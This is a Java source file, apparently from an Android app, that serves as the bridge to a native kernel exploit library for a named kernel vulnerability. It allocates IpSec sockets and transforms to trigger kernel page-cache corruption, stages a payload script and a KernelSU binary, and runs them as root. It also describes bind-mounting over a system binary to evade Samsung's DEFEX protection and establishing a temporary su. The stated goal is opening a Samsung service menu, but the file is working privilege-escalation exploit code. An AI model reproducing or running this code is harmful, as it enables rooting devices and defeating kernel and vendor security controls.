package df.root;

import android.content.Context;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;

import online.usim.go2servicemode.BuildConfig;

/**
 * go2servicemode — DirtyFrag (CVE-2026-43284) reduced to a one-shot privileged
 * action.
 *
 * <p>Bridge ported from {@code df.root.DFBridge} in UniRoot 5.0.0, itself a
 * port of diabl0w/DFRoot. Public APIs only: {@link IpSecManager} allocates the
 * socket/SPI/transform, the native engine ({@code libexp.so}) corrupts kernel
 * page cache, runs its payload in a root usermode-helper context and cleans up.
 *
 * <p><b>Deliberate difference from UniRoot:</b> the payload staged into the
 * app's data dir is <em>not</em> ksud. There is no KernelSU, no {@code su}, no
 * {@code --allow-shell}, no {@code /data/adb}, no {@code /system/bin/su}. The
 * staged file is a short shell script that performs exactly one action —
 * launch Samsung ServiceMode with one of two whitelisted keyStrings — and
 * exits. Nothing this app does is reusable afterwards: no shell survives, and
 * no root channel is exposed to any other process.
 */
public final class DFBridge {

    /** The only two keyStrings this tool can ever send. */
    public static final String KEY_GCF = "4238378";
    public static final String KEY_NAS = "27663368378";

    /** ServiceMode entry point (activity is exported="false"; root is required). */
    public static final String COMPONENT =
            "com.sec.android.RilServiceModeApp"
                    + "/com.sec.android.RilServiceModeApp.ServiceModeApp";

    /**
     * Name the native engine exec()s inside the app data dir root
     * (argv[0] = "logcat"). The string is baked into libexp.so, so it must stay
     * literally "ksud" — but only ever holds our script, never a real ksud.
     */
    private static final String STAGE_NAME = "ksud";

    /** Where the staged script appends its own diagnostics (root-writable). */
    private static final String RUN_LOG = "/data/local/tmp/go2servicemode.log";

    /**
     * Absolute path the <em>patched</em> libexp.so reads the payload from. The
     * upstream .so hard-codes this literal (with UniRoot's package name); see
     * tools/patch_libexp_path.py. If applicationId ever changes, libexp.so must
     * be re-patched or the engine will silently read nothing.
     */
    private static final String STAGED_ABS_PATH =
            "/data/data/" + BuildConfig.APPLICATION_ID + "/ksud";

    /**
     * The real ksud userspace binary (extracted from assets). It is staged under
     * a different name so the engine's "ksud" slot stays our script.
     */
    private static final String KSUD_ASSET = "df/ksud-real";
    private static final String HELPER_ASSET = "helper.sh";
    private static final String KSUD_STAGED =
            "/data/data/" + BuildConfig.APPLICATION_ID + "/ksud-real";

    /**
     * The payload, shipped verbatim as an asset and syntax-checked offline with
     * `sh -n`. Substituted at stage time: @KEYSTRING@ and @DATA_DIR@.
     */
    private static final String PAYLOAD_ASSET = "payload.sh";

    private static boolean loaded = false;

    private DFBridge() {}

    /** Loads libexp.so. Idempotent. */
    public static synchronized void load() {
        if (loaded) return;
        System.loadLibrary("exp");
        loaded = true;
    }

    public static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                          byte[] aesCbcKey, byte[] hmacKey, int icvLen,
                                          int senderPort, boolean softReboot);

    /**
     * TRANSACTION 1 — establish the temporary su. Deliberately takes no
     * keyString: opening a menu is transaction 2 and must not be entangled with
     * bootstrapping privilege, otherwise a failure cannot be attributed to
     * either half.
     *
     * @return the engine return code; {@code 0} means the engine believes its
     *         own success probe passed.
     */
    public static int establishSu(Context context, IReporter reporter) {
        return runEngine(context, null, reporter);
    }

    /**
     * TRANSACTION 2 (not wired yet) — ask ServiceMode to open with a
     * whitelisted keyString. Exists so the whitelist lives in one place; the
     * privileged call itself still has to run as root.
     */
    public static int openMenu(Context context, String keyString, IReporter reporter) {
        if (!KEY_GCF.equals(keyString) && !KEY_NAS.equals(keyString)) {
            reporter.report("refusing key outside the whitelist\n");
            return -2;
        }
        return runEngine(context, keyString, reporter);
    }

    private static int runEngine(Context context, String keyString, IReporter reporter) {
        try {
            load();

            IpSecManager ipsec = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);

            IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
            int encapPort = encapSock.getPort();
            reporter.report("encap port: " + encapPort + "\n");

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            IpSecManager.SecurityParameterIndex spiObj =
                    ipsec.allocateSecurityParameterIndex(loopback);
            int spiVal = spiObj.getSpi();
            reporter.report("spi: 0x" + Integer.toHexString(spiVal) + "\n");

            SecureRandom rng = new SecureRandom();
            byte[] aesKey = new byte[32];
            byte[] hmacKey = new byte[32];
            rng.nextBytes(aesKey);
            rng.nextBytes(hmacKey);

            DatagramSocket senderSock = new DatagramSocket();
            int senderPort = senderSock.getLocalPort();
            senderSock.close();

            IpSecTransform transform = new IpSecTransform.Builder(context)
                    .setEncryption(new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
                    .setAuthentication(
                            new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128))
                    .setIpv4Encapsulation(encapSock, senderPort)
                    .buildTransportModeTransform(loopback, spiObj);

            stageKsudReal(context, reporter);
            stageHelper(context, reporter);
            stagePayload(context, keyString, reporter);

            int rc = nativeRunAll(reporter, encapPort, spiVal, aesKey, hmacKey, 128 / 8,
                    senderPort, false);

            transform.close();
            spiObj.close();
            encapSock.close();
            return rc;
        } catch (Throwable t) {
            reporter.report("exception: " + t + "\n");
            return -1;
        }
    }

    /**
     * Extracts the bundled ksud userspace binary once. It is only ever exec'd
     * through the bind-mount over /system/bin/atrace, so that Samsung DEFEX sees
     * a real system-path binary (the same trick the upstream wrapper uses).
     */
    private static void stageKsudReal(Context context, IReporter reporter) throws IOException {
        File dataDirRoot = context.getFilesDir().getParentFile();
        if (dataDirRoot == null) throw new IOException("no data dir");
        File dest = new File(dataDirRoot, "ksud-real");

        if (dest.isFile() && dest.length() > 100_000) {
            reporter.report("ksud-real already staged (" + dest.length() + " bytes)\n");
            return;
        }

        File tmp = new File(dest.getPath() + ".tmp");
        long total = 0;
        try (InputStream in = context.getAssets().open(KSUD_ASSET);
             OutputStream out = new FileOutputStream(tmp)) {
            byte[] buf = new byte[8192];
            for (int n; (n = in.read(buf)) > 0; ) {
                out.write(buf, 0, n);
                total += n;
            }
        }
        if (!tmp.renameTo(dest)) {
            tmp.delete();
            throw new IOException("rename failed: " + dest);
        }
        dest.setExecutable(true, false);
        reporter.report("staged " + KSUD_ASSET + " -> " + dest.getAbsolutePath()
                + " (" + total + " bytes)\n");
    }

    /**
     * Writes the transaction-2 helper script so transaction 1 can start it as
     * root. The helper is the only place a privileged command runs, and it is
     * started from the payload (not from the app) so the app itself never needs
     * to see su — it cannot, the bind-mount lives in another mount namespace.
     */
    private static void stageHelper(Context context, IReporter reporter) throws IOException {
        File dest = new File(context.getFilesDir(), "helper.sh");
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        try (InputStream in = context.getAssets().open(HELPER_ASSET)) {
            byte[] buf = new byte[8192];
            for (int n; (n = in.read(buf)) > 0; ) {
                bos.write(buf, 0, n);
            }
        }
        String script = new String(bos.toByteArray(), StandardCharsets.UTF_8)
                .replace("@DATA_DIR@", "/data/data/" + BuildConfig.APPLICATION_ID);
        File tmp = new File(dest.getPath() + ".tmp");
        try (OutputStream out = new FileOutputStream(tmp)) {
            out.write(script.getBytes(StandardCharsets.UTF_8));
        }
        if (!tmp.renameTo(dest)) {
            tmp.delete();
            throw new IOException("rename failed: " + dest);
        }
        dest.setExecutable(true, false);
        reporter.report("staged " + HELPER_ASSET + " -> " + dest.getAbsolutePath() + "\n");
    }

    /**
     * Writes the transaction script where the engine expects the payload.
     * {@code keyString} is {@code null} for transaction 1; passing {@code null}
     * is how the code states that bootstrapping privilege needs no menu key.
     */
    private static void stagePayload(Context context, String keyString, IReporter reporter)
            throws IOException {
        File dataDirRoot = context.getFilesDir().getParentFile();
        if (dataDirRoot == null) throw new IOException("no data dir");
        File dest = new File(dataDirRoot, STAGE_NAME);

        File tmp = new File(dest.getPath() + ".tmp");
        try (OutputStream out = new FileOutputStream(tmp)) {
            out.write(loadPayload(context, keyString).getBytes(StandardCharsets.UTF_8));
        }
        if (!tmp.renameTo(dest)) {
            tmp.delete();
            throw new IOException("rename failed: " + dest);
        }
        dest.setExecutable(true, false);
        reporter.report("staged " + (keyString == null ? "tx1-su" : "menu key=" + keyString)
                + " -> " + dest.getAbsolutePath() + "\n");
    }

    /**
     * Loads the payload from assets and substitutes the two placeholders.
     *
     * The asset is the single source of truth: it is syntax-checked offline with
     * `sh -n`, so what runs on the device is exactly what was verified. An
     * earlier version generated this script from Java string concatenation; the
     * generated copy diverged from the verified one, failed to parse, and the
     * payload silently never executed.
     */
    private static String loadPayload(Context context, String keyString) throws IOException {
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        try (InputStream in = context.getAssets().open(PAYLOAD_ASSET)) {
            byte[] buf = new byte[8192];
            for (int n; (n = in.read(buf)) > 0; ) {
                bos.write(buf, 0, n);
            }
        }
        String tpl = new String(bos.toByteArray(), StandardCharsets.UTF_8);
        return tpl.replace("@KEYSTRING@", keyString == null ? "" : keyString)
                .replace("@DATA_DIR@", "/data/data/" + BuildConfig.APPLICATION_ID);
    }
}
